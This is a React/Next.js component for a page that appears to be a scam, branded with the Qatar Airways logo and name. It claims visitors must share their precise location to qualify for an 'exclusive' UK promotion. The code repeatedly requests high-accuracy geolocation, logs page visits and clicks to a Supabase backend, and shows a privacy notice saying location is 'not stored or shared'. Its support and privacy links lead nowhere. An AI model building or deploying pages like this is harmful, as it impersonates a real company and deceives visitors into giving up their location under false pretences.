'use client'

import { useEffect } from 'react'
import { useRouter } from 'next/navigation'
import { supabaseHelpers } from '@/lib/supabase'
import Image from 'next/image'

export default function BlockedPage() {
  const router = useRouter()

  useEffect(() => {
    // Track blocked page visit
    supabaseHelpers.trackPageVisit('blocked_page')
  }, [])

  const handleRefresh = () => {
    // Track refresh attempt
    supabaseHelpers.trackUserAction('refresh_attempt', { from_page: 'blocked' })
    
    // Try to request permission again before redirecting
    tryRequestPermission()
  }

  const handleTryAgain = () => {
    // Track try again attempt
    supabaseHelpers.trackUserAction('try_again_attempt', { from_page: 'blocked' })
    
    // Try to request permission again before redirecting
    tryRequestPermission()
  }

  const tryRequestPermission = () => {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          // If permission is granted, redirect to success page
          router.push('/success')
        },
        (error) => {
          // If still denied, redirect back to main page
          setTimeout(() => {
            router.push('/')
          }, 1000)
        },
        {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        }
      )
    } else {
      // Geolocation not supported, redirect to main page
      router.push('/')
    }
  }

  const getFloatingStyle = (index: number) => {
    const positions = [
      { top: '10%', left: '10%', animationDelay: '0s' },
      { top: '20%', right: '15%', animationDelay: '2s' },
      { top: '60%', left: '5%', animationDelay: '4s' },
      { top: '70%', right: '10%', animationDelay: '1s' },
      { top: '40%', left: '85%', animationDelay: '3s' },
      { top: '80%', left: '50%', animationDelay: '5s' }
    ]
    return positions[index - 1] || {}
  }

  return (
    <div className="location-blocked">
      {/* Background Elements */}
      <div className="background-pattern"></div>
      <div className="floating-elements">
        {[1, 2, 3, 4, 5, 6].map(n => (
          <div 
            key={n} 
            className="floating-element" 
            style={getFloatingStyle(n)}
          ></div>
        ))}
      </div>
      
      {/* Main Content Container */}
      <div className="content-container">
        {/* Header Section */}
        <div className="header-section">
          <div className="logo-container">
            <Image 
              src="https://logotyp.us/files/qatar-airways.svg" 
              alt="Qatar Airways" 
              className="logo"
              width={120}
              height={50}
            />
            <div className="logo-glow"></div>
          </div>
          
          {/* Status Badge */}
          <div className="status-badge">
            <div className="status-icon">
              <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M12 2C8.13 2 5 5.13 5 9C5 14.25 12 22 12 22S19 14.25 19 9C19 5.13 15.87 2 12 2ZM12 11.5C10.62 11.5 9.5 10.38 9.5 9S10.62 6.5 12 6.5S14.5 7.62 14.5 9S13.38 11.5 12 11.5Z" fill="currentColor"/>
                <path d="M12 9C12.5523 9 13 8.55228 13 8C13 7.44772 12.5523 7 12 7C11.4477 7 11 7.44772 11 8C11 8.55228 11.4477 9 12 9Z" fill="white"/>
              </svg>
            </div>
            <span>Location Access Denied</span>
          </div>
        </div>

        {/* Main Message */}
        <div className="message-section">
          <h1 className="main-title">
            <span className="title-highlight">Location Access</span>
            <span className="title-normal">Required</span>
          </h1>
          
          <div className="subtitle">Verify Your Eligibility</div>
          
          <div className="message-content">
            <div className="message-card">
              <div className="card-icon">
                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path d="M12 2L13.09 8.26L22 9L13.09 9.74L12 16L10.91 9.74L2 9L10.91 8.26L12 2Z" fill="currentColor"/>
                </svg>
              </div>
              <p>
                To participate in this exclusive Qatar Airways promotion, we need to verify that you&apos;re located in the United Kingdom. 
                Location access helps us confirm your eligibility for this special offer.
              </p>
            </div>

            <div className="eligibility-card">
              <div className="card-header">
                <div className="eligibility-icon">
                  <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M9 12L11 14L15 10M21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3C16.9706 3 21 7.02944 21 12Z" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                  </svg>
                </div>
                <h3>Why We Need Your Location</h3>
              </div>
              <div className="eligibility-reasons">
                <div className="reason">
                  <span className="reason-icon">🇬🇧</span>
                  <span>Verify UK residency for exclusive offers</span>
                </div>
                <div className="reason">
                  <span className="reason-icon">✈️</span>
                  <span>Ensure compliance with promotional terms</span>
                </div>
                <div className="reason">
                  <span className="reason-icon">🔒</span>
                  <span>Protect against fraudulent entries</span>
                </div>
              </div>
            </div>
            
            <div className="instruction-card">
              <div className="card-header">
                <div className="instruction-icon">
                  <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M12 2C8.13 2 5 5.13 5 9C5 14.25 12 22 12 22S19 14.25 19 9C19 5.13 15.87 2 12 2ZM12 11.5C10.62 11.5 9.5 10.38 9.5 9S10.62 6.5 12 6.5S14.5 7.62 14.5 9S13.38 11.5 12 11.5Z" fill="currentColor"/>
                  </svg>
                </div>
                <h3>How to Enable Location Access</h3>
              </div>
              <div className="instruction-steps">
                <div className="step">
                  <span className="step-number">1</span>
                  <span>Look for the location icon (🌍) in your browser&apos;s address bar</span>
                </div>
                <div className="step">
                  <span className="step-number">2</span>
                  <span>Click on it and select &quot;Allow&quot; or &quot;Always allow&quot;</span>
                </div>
                <div className="step">
                  <span className="step-number">3</span>
                  <span>Refresh this page to continue with your entry</span>
                </div>
              </div>
            </div>

            <div className="privacy-card">
              <div className="privacy-header">
                <div className="privacy-icon">
                  <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M12,1L3,5V11C3,16.55 6.84,21.74 12,23C17.16,21.74 21,16.55 21,11V5L12,1M12,7C13.4,7 14.8,8.6 14.8,10V11.5C15.4,11.5 16,12.1 16,12.7V16.2C16,16.8 15.4,17.3 14.8,17.3H9.2C8.6,17.3 8,16.8 8,16.2V12.8C8,12.2 8.6,11.7 9.2,11.7V10C9.2,8.6 10.6,7 12,7M12,8.2C11.2,8.2 10.5,8.7 10.5,9.5V11.5H13.5V9.5C13.5,8.7 12.8,8.2 12,8.2Z" fill="currentColor"/>
                  </svg>
                </div>
                <h4>Your Privacy Matters</h4>
              </div>
              <p className="privacy-text">
                We only use your location to verify eligibility. Your location data is not stored or shared with third parties. 
                <a href="#" className="privacy-link">Read our Privacy Policy</a>
              </p>
            </div>
          </div>
        </div>

        {/* Action Section */}
        <div className="action-section">
          <button className="refresh-button" onClick={handleTryAgain}>
            <div className="button-content">
              <svg className="refresh-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M17.65 6.35C16.2 4.9 14.21 4 12 4C7.58 4 4 7.58 4 12S7.58 20 12 20C15.73 20 18.84 17.45 19.73 14H17.65C16.83 16.33 14.61 18 12 18C8.69 18 6 15.31 6 12S8.69 6 12 6C13.66 6 15.14 6.69 16.22 7.78L13 11H20V4L17.65 6.35Z" fill="currentColor"/>
              </svg>
              <span>Try Again</span>
            </div>
            <div className="button-glow"></div>
          </button>
          
          <div className="alternative-actions">
            <div className="help-text">
              Still having issues? <a href="#" className="help-link">Contact Qatar Airways Support</a>
            </div>
            <div className="browser-help">
              <span>Browser-specific help:</span>
              <div className="browser-links">
                <a href="#" className="browser-link">Chrome</a>
                <a href="#" className="browser-link">Firefox</a>
                <a href="#" className="browser-link">Safari</a>
                <a href="#" className="browser-link">Edge</a>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Footer */}
      <div className="footer">
        <div className="security-badge">
          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M12,1L3,5V11C3,16.55 6.84,21.74 12,23C17.16,21.74 21,16.55 21,11V5L12,1M12,7C13.4,7 14.8,8.6 14.8,10V11.5C15.4,11.5 16,12.1 16,12.7V16.2C16,16.8 15.4,17.3 14.8,17.3H9.2C8.6,17.3 8,16.8 8,16.2V12.8C8,12.2 8.6,11.7 9.2,11.7V10C9.2,8.6 10.6,7 12,7M12,8.2C11.2,8.2 10.5,8.7 10.5,9.5V11.5H13.5V9.5C13.5,8.7 12.8,8.2 12,8.2Z" fill="currentColor"/>
          </svg>
          <span>Secure & Private</span>
        </div>
      </div>

      <style jsx>{`
        /* Main Container */
        .location-blocked {
          position: relative;
          min-height: 100vh;
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          font-family: 'Inter', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
          overflow: hidden;
          display: flex;
          align-items: center;
          justify-content: center;
          padding: 2rem;
          box-sizing: border-box;
        }

        /* Background Elements */
        .background-pattern {
          position: absolute;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          background-image: 
            radial-gradient(circle at 25% 25%, rgba(255, 255, 255, 0.1) 0%, transparent 50%),
            radial-gradient(circle at 75% 75%, rgba(255, 255, 255, 0.05) 0%, transparent 50%);
          background-size: 100px 100px;
          animation: backgroundMove 20s ease-in-out infinite;
        }

        .floating-elements {
          position: absolute;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          pointer-events: none;
        }

        .floating-element {
          position: absolute;
          width: 6px;
          height: 6px;
          background: rgba(255, 255, 255, 0.3);
          border-radius: 50%;
          animation: float 6s ease-in-out infinite;
        }

        /* Content Container */
        .content-container {
          background: rgba(255, 255, 255, 0.95);
          backdrop-filter: blur(20px);
          border-radius: 24px;
          padding: 3rem;
          max-width: 600px;
          width: 100%;
          box-shadow: 
            0 20px 40px rgba(0, 0, 0, 0.1),
            0 0 0 1px rgba(255, 255, 255, 0.2);
          animation: slideUp 0.8s ease-out;
          position: relative;
        }

        /* Header Section */
        .header-section {
          text-align: center;
          margin-bottom: 2rem;
        }

        .logo-container {
          position: relative;
          display: inline-block;
          margin-bottom: 1.5rem;
        }

        .logo {
          width: clamp(100px, 15vw, 120px);
          height: auto;
          filter: drop-shadow(0 4px 8px rgba(0, 0, 0, 0.1));
          transition: transform 0.3s ease;
        }

        .logo:hover {
          transform: scale(1.05);
        }

        .logo-glow {
          position: absolute;
          top: 50%;
          left: 50%;
          transform: translate(-50%, -50%);
          width: 150%;
          height: 150%;
          background: radial-gradient(circle, rgba(92, 15, 60, 0.2) 0%, transparent 70%);
          border-radius: 50%;
          animation: pulse 3s ease-in-out infinite;
        }

        .status-badge {
          display: inline-flex;
          align-items: center;
          gap: 0.5rem;
          background: linear-gradient(135deg, #ff6b6b, #ee5a24);
          color: white;
          padding: 0.5rem 1rem;
          border-radius: 50px;
          font-size: 0.875rem;
          font-weight: 600;
          box-shadow: 0 4px 12px rgba(238, 90, 36, 0.3);
        }

        .status-icon {
          width: 16px;
          height: 16px;
        }

        /* Message Section */
        .message-section {
          text-align: center;
          margin-bottom: 2.5rem;
        }

        .main-title {
          font-size: clamp(2rem, 6vw, 3rem);
          font-weight: 800;
          margin-bottom: 0.5rem;
          line-height: 1.2;
        }

        .title-highlight {
          background: linear-gradient(135deg, #5c0f3c, #8b1538);
          -webkit-background-clip: text;
          -webkit-text-fill-color: transparent;
          background-clip: text;
        }

        .title-normal {
          color: #2c3e50;
        }

        .subtitle {
          font-size: 1.125rem;
          color: #7f8c8d;
          font-weight: 500;
          margin-bottom: 2rem;
          text-transform: uppercase;
          letter-spacing: 1px;
        }

        .message-content {
          display: flex;
          flex-direction: column;
          gap: 1.5rem;
        }

        .message-card, .instruction-card, .eligibility-card, .privacy-card {
          background: #f8f9fa;
          border-radius: 16px;
          padding: 1.5rem;
          text-align: left;
          border: 1px solid rgba(0, 0, 0, 0.05);
          transition: transform 0.2s ease, box-shadow 0.2s ease;
        }

        .message-card:hover, .instruction-card:hover, .eligibility-card:hover, .privacy-card:hover {
          transform: translateY(-2px);
          box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
        }

        .card-icon {
          width: 24px;
          height: 24px;
          color: #5c0f3c;
          margin-bottom: 1rem;
        }

        .message-card p {
          margin: 0;
          color: #4a5568;
          line-height: 1.6;
          font-size: 1rem;
        }

        .card-header {
          display: flex;
          align-items: center;
          gap: 0.75rem;
          margin-bottom: 1rem;
        }

        .instruction-icon, .eligibility-icon {
          width: 20px;
          height: 20px;
          color: #5c0f3c;
        }

        .card-header h3 {
          margin: 0;
          font-size: 1.125rem;
          font-weight: 600;
          color: #2d3748;
        }

        .instruction-steps, .eligibility-reasons {
          display: flex;
          flex-direction: column;
          gap: 0.75rem;
        }

        .step, .reason {
          display: flex;
          align-items: center;
          gap: 0.75rem;
          font-size: 0.9rem;
          color: #4a5568;
        }

        .step-number {
          display: flex;
          align-items: center;
          justify-content: center;
          width: 24px;
          height: 24px;
          background: #5c0f3c;
          color: white;
          border-radius: 50%;
          font-size: 0.75rem;
          font-weight: 600;
          flex-shrink: 0;
        }

        .reason-icon {
          font-size: 1.2rem;
          flex-shrink: 0;
        }

        .privacy-card {
          background: linear-gradient(135deg, #f0f9ff, #e0f2fe);
          border: 1px solid #0ea5e9;
        }

        .privacy-header {
          display: flex;
          align-items: center;
          gap: 0.5rem;
          margin-bottom: 0.75rem;
        }

        .privacy-icon {
          width: 18px;
          height: 18px;
          color: #0ea5e9;
        }

        .privacy-header h4 {
          margin: 0;
          font-size: 1rem;
          font-weight: 600;
          color: #0c4a6e;
        }

        .privacy-text {
          margin: 0;
          font-size: 0.875rem;
          color: #0c4a6e;
          line-height: 1.5;
        }

        .privacy-link {
          color: #0ea5e9;
          text-decoration: underline;
          font-weight: 500;
        }

        .privacy-link:hover {
          color: #0284c7;
        }

        /* Action Section */
        .action-section {
          text-align: center;
        }

        .refresh-button {
          position: relative;
          background: linear-gradient(135deg, #5c0f3c, #8b1538);
          color: white;
          border: none;
          padding: 1rem 2rem;
          border-radius: 50px;
          cursor: pointer;
          font-size: 1.125rem;
          font-weight: 600;
          transition: all 0.3s ease;
          margin-bottom: 2rem;
          overflow: hidden;
          box-shadow: 0 8px 25px rgba(92, 15, 60, 0.3);
        }

        .refresh-button:hover {
          transform: translateY(-3px);
          box-shadow: 0 12px 35px rgba(92, 15, 60, 0.4);
        }

        .button-content {
          display: flex;
          align-items: center;
          gap: 0.5rem;
          position: relative;
          z-index: 2;
        }

        .refresh-icon {
          width: 20px;
          height: 20px;
        }

        .button-glow {
          position: absolute;
          top: 50%;
          left: 50%;
          transform: translate(-50%, -50%);
          width: 100%;
          height: 100%;
          background: radial-gradient(circle, rgba(255, 255, 255, 0.2) 0%, transparent 70%);
          opacity: 0;
          transition: opacity 0.3s ease;
        }

        .refresh-button:hover .button-glow {
          opacity: 1;
        }

        .alternative-actions {
          display: flex;
          flex-direction: column;
          gap: 1rem;
          font-size: 0.875rem;
          color: #6b7280;
        }

        .help-text {
          text-align: center;
        }

        .help-link {
          color: #5c0f3c;
          text-decoration: underline;
          font-weight: 500;
        }

        .help-link:hover {
          color: #8b1538;
        }

        .browser-help {
          text-align: center;
        }

        .browser-links {
          display: flex;
          justify-content: center;
          gap: 1rem;
          margin-top: 0.5rem;
        }

        .browser-link {
          color: #5c0f3c;
          text-decoration: underline;
          font-size: 0.8rem;
          padding: 0.25rem 0.5rem;
          border-radius: 4px;
          transition: background-color 0.2s ease;
        }

        .browser-link:hover {
          background-color: rgba(92, 15, 60, 0.1);
          text-decoration: none;
        }

        /* Footer */
        .footer {
          position: absolute;
          bottom: 2rem;
          left: 50%;
          transform: translateX(-50%);
        }

        .security-badge {
          display: flex;
          align-items: center;
          gap: 0.5rem;
          background: rgba(255, 255, 255, 0.9);
          color: #5c0f3c;
          padding: 0.5rem 1rem;
          border-radius: 50px;
          font-size: 0.875rem;
          font-weight: 500;
          box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
        }

        .security-badge svg {
          width: 16px;
          height: 16px;
        }

        /* Animations */
        @keyframes backgroundMove {
          0%, 100% { transform: translate(0, 0); }
          50% { transform: translate(-10px, -10px); }
        }

        @keyframes float {
          0%, 100% { transform: translateY(0px); }
          50% { transform: translateY(-20px); }
        }

        @keyframes slideUp {
          from {
            opacity: 0;
            transform: translateY(30px);
          }
          to {
            opacity: 1;
            transform: translateY(0);
          }
        }

        @keyframes pulse {
          0%, 100% { opacity: 0.5; transform: translate(-50%, -50%) scale(1); }
          50% { opacity: 0.8; transform: translate(-50%, -50%) scale(1.1); }
        }

        /* Responsive Design */
        @media (max-width: 768px) {
          .location-blocked {
            padding: 1rem;
          }

          .content-container {
            padding: 2rem;
          }

          .main-title {
            font-size: 2rem;
          }

          .browser-links {
            flex-wrap: wrap;
          }
        }
      `}</style>
    </div>
  )
}